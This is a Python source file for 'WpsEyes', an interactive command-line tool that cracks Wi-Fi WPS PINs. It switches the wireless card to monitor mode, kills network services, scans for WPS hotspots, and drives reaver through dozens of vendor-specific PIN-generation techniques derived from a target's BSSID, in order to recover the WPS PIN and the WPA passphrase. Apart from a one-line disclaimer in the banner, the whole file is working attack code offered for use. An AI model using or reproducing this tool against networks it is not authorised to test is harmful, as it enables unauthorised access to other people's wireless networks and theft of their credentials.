#!/usr/bin/python3

import os
import cmd
import subprocess as sp
from netifaces import ifaddresses as ifaddr
from sys import exit

import signal

if not 'SUDO_UID' in os.environ.keys():
	print ("\033[1m\033[95m\nThis programm requires SUDO privileges! Exiting...\n")
	exit(1)

from technqs import *
tests = [pin24, pin28, pin32, pin36, pin40, pin44, pin48, pin24rh, pin32rh, pin48rh, pin24rn, pin32rn, pin48rn, pin24rb, pin32rb, pin48rb, pinDLink, pinDLinkInc1, pinEasyBox, pinASUS, pinAircon, pinInvNIC, pinNIC2, pinNIC3, pinOUIaddNIC, pinOUIsubNIC, pinOUIxorNIC, Dynamic_1, Dynamic_2, Dynamic_3, Dynamic_4, Dynamic_5, Dynamic_6, Dynamic_7, Dynamic_8, Dynamic_9, Dynamic_10, Dynamic_11, Dynamic_12, Dynamic_13, Dynamic_14, Static_1, Static_2, Static_3]

wpserror = 0

class bcolors:
	HEADER = '\033[95m'
	OKBLUE = '\033[94m'
	OKGREEN = '\033[92m'
	WARNING = '\033[93m'
	FAIL = '\033[91m'
	ENDC = '\033[0m'
	BOLD = '\033[1m'

def handler_STP(signum, frame):
	pass

def handler_INT(signum, frame):
	os.system('sudo ip link set %s down' % WpsEyes.interface)
	os.system('sudo iw %s set type managed' % WpsEyes.interface)
	os.system('sudo ip link set %s up' % WpsEyes.interface)
	os.system('sudo systemctl restart NetworkManager')
	print(bcolors.HEADER + 'Bye-bye! . . .\n')
	exit(1)

def toMonitor(interface):
	result = sp.Popen(['sudo', 'iw',interface,'info'], stdout=sp.PIPE,bufsize=1)
	for line in iter(result.stdout.readline, b''):
		stroka = line.decode('utf-8')
		if 'type monitor' in stroka.strip():
			return False
	if WpsEyes.verbose: print(bcolors.WARNING + 'Stopping the NetworkManager . . .')
	os.system('sudo airmon-ng check kill > /dev/null')
	if WpsEyes.verbose: print(bcolors.WARNING + 'Changing the interface mode . . .')
	os.system('sudo ip link set %s down' % interface)
	os.system('sudo iw %s set monitor control' % interface)
	os.system('sudo ip link set %s up' % interface)
	return True

def isMAC48Address(inputString):
	global wpserror
	wpserror = 0
	if inputString.count(":")!=5:
		return False
	for i in inputString.split(":"):
		for j in i:
			if j>"F" or (j<"A" and not j.isdigit()) or len(i)!=2:
				return False
	return True 

def check(bssid,pin,tmt,trs):
	global wpserror
	fh = open(os.devnull,"w")
	action = sp.Popen(['timeout',tmt,'reaver','-i',str(WpsEyes.interface),'-b',bssid,'-F','-vv','-p',pin,'-g',trs], stdout = sp.PIPE, stderr=fh, bufsize=1)
	for line in iter(action.stdout.readline, b''):
		line = line.decode('utf-8')[:-1]
		if WpsEyes.verbose: print(bcolors.WARNING + line)
		if 'WPS PIN' in line:
			print(bcolors.OKGREEN + line)
		if 'WPA PSK' in line:
			print(bcolors.OKGREEN + line)
		if 'AP SSID' in line:
			print(bcolors.OKGREEN + line)
			print()
			return True
		if 'Failed to recover WPA key' in line:
			wpserror = 0
			return False
	fh.close()
	if WpsEyes.verbose: print(bcolors.FAIL + 'AP not responding! Maybe AP-Lock/Firewall or weak wi-fi signal?\nERROR: Timeout error\n')
	wpserror += 1
	return False

class WpsEyes(cmd.Cmd):
	prompt  = bcolors.OKGREEN + ">> " + bcolors.ENDC
	intro = bcolors.OKGREEN + "Type 'help' to view help page\nPress Ctrl+D or type 'EOF' to exit\n"
	nohelp = bcolors.FAIL + "[!] Help page of '%s' not found\n"
	doc_header = bcolors.OKBLUE + "Commands list (type 'help <command>'):"
	interface = ''
	verbose = False

	def do_EOF(self,_):
		"\033[94m[?] Exit from WpsEyes\n"
		print(bcolors.HEADER + 'Bye-bye! . . .\n')
		return True

	def do_help(self,arg):
		'\033[94m[?] Show help page\n'
		if arg:
			try:
				func = getattr(self, 'help_' + arg)
			except AttributeError:
				try:
					doc=getattr(self, 'do_' + arg).__doc__
					if doc:
						self.stdout.write("%s\n"%str(doc))
						return
				except AttributeError:
					pass
				self.stdout.write("%s\n"%str(self.nohelp % (arg,)))
				return
			func()
		else:
			names = self.get_names()
			cmds_doc = []
			cmds_undoc = []
			help = {}
			for name in names:
				if name[:5] == 'help_':
					help[name[5:]]=1
			names.sort()
			prevname = ''
			for name in names:
				if name[:3] == 'do_':
					if name == prevname:
						continue
					prevname = name
					cmd=name[3:]
					if cmd in help:
						cmds_doc.append(cmd)
						del help[cmd]
					elif getattr(self, name).__doc__:
						cmds_doc.append(cmd)
					else:
						cmds_undoc.append(cmd)
			self.stdout.write("%s"%str(self.doc_leader))
			self.print_topics(self.doc_header,   cmds_doc,   15,80)
			self.print_topics(self.misc_header,  list(help.keys()),15,80)
			self.print_topics(self.undoc_header, cmds_undoc, 15,80)

	def do_interface(self, line):
		"\033[94m[?] Set and configure an wireless interface to use\nExample: 'interface <wlan0>'\n"
		if len(line) < 1:
			print(bcolors.FAIL + "[!] Please select an wireless interface to use\nExample: 'interface <wlan0>'\n")
			return
		if not self.is_interface_up(line):
			print(bcolors.FAIL + "[!] Interface not exist or down: %s\n" % line)
		else:
			WpsEyes.interface = line
			if toMonitor(WpsEyes.interface):
				print(bcolors.OKGREEN + "Wireless interface: %s - in monitor mode and currently set by default\n" % WpsEyes.interface)
			else:
				print(bcolors.OKGREEN + "Wireless interface: %s - already ready\n" % WpsEyes.interface)

	def do_wash(self, arg):
		"\033[94m[?] Show nearby Wi-Fi hotspots with WPS\nExample: 'wash <10>' (timeout in seconds)\n"
		if len(WpsEyes.interface) < 1:
			print(bcolors.FAIL + "[!] Please select an wireless interface to use\nExample: 'interface <wlan0>'\n")
			return
		if not arg.isalnum() or len(arg) < 1:
			print(bcolors.FAIL + "[!] Timeout value is not correct!\nExample: 'wash <10>'\n")
			return
		result = sp.Popen(['timeout',arg,'wash', '-i',str(WpsEyes.interface)], stdout=sp.PIPE,bufsize=1)
		for line in iter(result.stdout.readline, b''):
			print(bcolors.OKGREEN + line.decode('utf-8')[:-1])
		print()

	def default(self, line):
		print(bcolors.FAIL + "[!] Unknown command: %s\n" % line)

	def emptyline(_):
		print(bcolors.FAIL + "[!] Nothing to execute\n")

	def is_interface_up(self, interface):
		try:
			addr = ifaddr(interface)
			return True
		except:
			return False

	def do_crack(self, line):
		"\033[94m[?] Start cracking WPS of target wireless hotspot by BSSID\nExample: 'crack <BSSID> <timeout=10> <attempts=2>'\n"
		
		timeout_to_check = '10'
		connections = '2'
		max_attempts = 5
		
		arg = line.split()
		line = arg[0]
		if len(WpsEyes.interface) < 1:
			print(bcolors.FAIL + "[!] Please select an wireless interface to use\nExample: 'interface <wlan0>'\n")
			return
		if len(line) < 1:
			print(bcolors.FAIL + "[!] Argument with BSSID can not be empty\nExample: 'crack <BSSID>'\n")
			return
		if not isMAC48Address(line):
			print(bcolors.FAIL + "[!] Please check the BSSID in argument of this command\nExample: 'crack <BSSID>'\n")
			return
		if len(arg) > 1 and arg[1].isalnum(): timeout_to_check = arg[1]
		if len(arg) > 2 and arg[2].isalnum(): connections = arg[2]
		mac = line.replace(":", "").replace("-", "").replace(" ", "").replace(".", "")
		for test in tests:
			if wpserror > max_attempts-1:
				print(bcolors.HEADER + "Connection with %s hasn't been established\n" % line)
				break
			print(bcolors.WARNING + 'Trying to crack via',test.__name__,'technique')
			if WpsEyes.verbose: print(bcolors.WARNING + 'Checking WPS-PIN ->',test(mac))
			if check(line,test(mac),timeout_to_check,connections):
				print(bcolors.OKGREEN + "CORRECT WPS-PIN FOUND!\n")
				break
			else:
				print(bcolors.FAIL + "Incorrect! Next...\n")
				continue
		return

	def do_verbose(self,_):
		"\033[94m[?] Change verbose mode of the script output\n"
		if not WpsEyes.verbose:
			print(bcolors.HEADER + "Verbose mode ON\n")
			WpsEyes.verbose = True
		else:
			print(bcolors.HEADER + "Verbose mode OFF\n")
			WpsEyes.verbose = False

if __name__ == '__main__':
	print (bcolors.BOLD)
	print
	print("╦ ╦╔═╗╔═╗┌─┐┬ ┬┌─┐┌─┐")
	print("║║║╠═╝╚═╗├┤ └┬┘├┤ └─┐")
	print("╚╩╝╩  ╚═╝└─┘ ┴ └─┘└─┘")
	print("Author: @hackzard")
	print("Russia, January 2017")
	print
	print("Please don't use this script to hack private wireless networks.\n")
	print("Use it ONLY for the analysis of the security of your own Wi-Fi or by joint agreement.")
	print (bcolors.ENDC)

	signal.signal(signal.SIGTSTP, handler_STP)
	signal.signal(signal.SIGINT, handler_INT)

	WpsEyes().cmdloop()
